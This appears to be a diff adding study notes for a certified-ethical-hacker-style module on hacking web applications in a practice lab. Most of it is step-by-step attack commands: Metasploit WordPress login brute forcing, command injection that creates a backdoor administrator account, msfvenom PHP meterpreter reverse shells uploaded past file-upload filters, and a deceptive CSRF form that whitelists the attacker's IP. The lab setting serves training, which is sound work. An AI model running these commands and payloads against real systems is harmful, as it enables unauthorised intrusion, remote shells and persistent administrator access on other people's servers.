@@ -1,0 +1,114 @@
+Module 14: Hacking Web Applications
+
+Exploiting Parameter Tampering and XSS Vulnerabilities in Web Applications
+	Parameter tampering
+	Cross-site scripting (XSS or CSS) - inject client-side scripts
+
+Enumerating and Hacking a Web Application Using WPScan and Metasploit
+	In Kali Linux, WPScan --url http://[IP Address of Windows Server 2012]:8080/CEH --enumerate u
+	msfconsole
+	use auxiliary/scanner/http/wordpress_login_enum
+	show options
+	set PASS_FILE /root/Desktop/Wordlists/Passwords.txt
+	set RHOSTS [IP Address of Windows Server 2012]
+	set RPORT 8080
+	set TARGETURI http://[IP Address of Windows Server 2012]:8080/CEH/
+	set USERNAME admin (or any user obtained with WPScan)
+	run
+
+Exploiting Remote Command Execution Vulnerability to Compromise a Target Web Server
+	In Windows 10, open http://10.10.10.12:8080/dvwa
+	Command Injection > ping.
+	It blocks other cmds ( | hostname )
+	DVWA Security: Impossible > Low
+	Command Injection > ping.
+	It executes other cmds ( | hostname )
+	| whoami
+	| tasklist
+	| dir C:\
+	| net user
+	| net user Test /Add
+	| net user
+	| net user Test
+	| net localgroup Administrators Test /Add
+	| net user Test
+	Start --> Windows Accessories --> Remote Desktop Connection.
+	
+Auditing Web Application Framework Using Vega
+	In Kali Linux, Applications --> 03 - Web Application Analysis --> Vega
+	Injection Modules + Response Processing Modules
+
+Website Vulnerability Scanning Using Acunetix WVS
+	Business Criticality - High
+	Full Scan/ OWASP Top 10/ Instant
+
+Exploiting File Upload Vulnerability at Different Security Levels
+	In Kali Linux, msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw
+	Use Leafpad to save payload in to upload.php
+	http://10.10.10.12:8080/dvwa/login.php
+	DVWA Security > Low
+	File Upload > upload.php
+	msfconsole
+	use multi/handler
+	show options
+	set payload php/meterpreter/reverse_tcp
+	set lhost 10.10.10.11
+	set lport 4444
+	run
+	http://10.10.10.12:8080/dvwa/hackable/uploads/upload.php
+	session is created automatically, if not: sessions -i 1
+	sysinfo
+	close all
+	
+	DVWA Security > Medium
+	File Upload > upload.php returns error
+	Rename payload to upload.php.jpg
+	Setup Burp Suite as an intercepting proxy
+	Upload the file upload.php.jpg
+	In Burp Suite, rename filename to upload.php
+	Upload is success. Remove proxy from browser
+	msfconsole
+	use multi/handler
+	set payload php/meterpreter/reverse_tcp
+	set lhost 10.10.10.11
+	set lport 4444
+	run
+	http://10.10.10.12:8080/dvwa/hackable/uploads/upload.php
+	session is created automatically, if not: sessions -i 1
+	sysinfo
+	close all
+	
+	DVWA Security > High
+	File Upload > upload.php returns error
+	Rename payload back to upload.php
+	With a text editor, Put GIF98 as first line.
+	Rename payload to upload.jpg
+	Upload is success
+	DVWA > Command Injection
+	|copy C:\wamp64\www\DVWA\hackable\uploads\upload.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php
+	msfconsole
+	use multi/handler
+	set payload php/meterpreter/reverse_tcp
+	set lhost 10.10.10.11
+	set lport 4444
+	run
+	http://10.10.10.12:8080/dvwa/hackable/uploads/shell.php
+	session is created automatically, if not: sessions -i 1
+	sysinfo
+	close all
+	
+Performing Cross-Site Request Forgery (CSRF) Attack (one-click attack or session riding)
+	In Windows 2012, http://10.10.10.12:8080/CEH/wp-login.php, Login as admin
+	Plugins > Wordpress Firewall 2 > Whitelist 10.10.10.12
+	In Kali Linux, wpscan -u http://10.10.10.12:8080/CEH --enumerate vp
+	Save this script as Security_Script.html
+	
+	<form method="POST" action="http://10.10.10.12:8080/CEH/wp-admin/optionsgeneral.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php">
+	<script>alert("As an Admin, To enable additional security to your Website. Click Submit")</script>
+	<input type="hidden" name="whitelisted_ip[]" value="10.10.10.11" >
+	<input type="hidden" name="set_whitelist_ip" value="Set Whitelisted IPs" class="button-secondary">
+	<input type="submit">
+	</form>
+	
+	Share Security_Script.html with Windows 2012(over smb:// share), open in WP logged in browser and click submit
+	Observe in Wordpress Firewall 2, Whitelisted IP changed to 10.10.10.11.
